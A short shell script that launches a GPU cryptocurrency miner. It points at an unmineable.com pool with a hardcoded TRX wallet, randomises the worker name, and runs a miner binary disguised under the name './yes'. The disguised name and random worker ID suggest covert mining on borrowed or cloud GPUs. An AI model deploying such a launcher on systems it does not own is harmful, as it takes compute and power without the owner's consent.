POOL=rx-us.unmineable.com:3333
WALLET=TRX:TRzjDbvibgAYo36wz5EnftmWLWy8z421SA
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo BsPQG2Fn-$(shuf -i 1921-849822 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
